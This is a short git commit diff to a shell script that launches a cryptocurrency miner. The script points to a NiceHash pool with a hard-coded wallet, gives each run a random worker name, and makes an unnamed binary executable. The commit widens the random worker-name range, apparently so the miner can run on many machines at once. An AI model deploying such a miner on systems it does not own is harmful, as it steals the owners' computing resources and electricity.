e3a3105f7fc5dc4d5821e7eea8efb4d43b1837b4
renilo <88342640+renilo@users.noreply.github.com>
2021-08-29 11:52:17 +0700

    Update kontol1.sh

--- kontol1.sh
+++ kontol1.sh
@@ -2,7 +2,7 @@ POOL=stratum+tcp://daggerhashimoto.eu.nicehash.com:3353
 
 WALLET=3D6NtTR5Zw5VmYx9ZNfHkLhXRp2uPb9BXk
 
-WORKER=$(echo $(shuf -i 1-10000 -n 1)-GPU)
+WORKER=$(echo $(shuf -i 1-100000 -n 1)-GPU)
 
 chmod +x memek
 
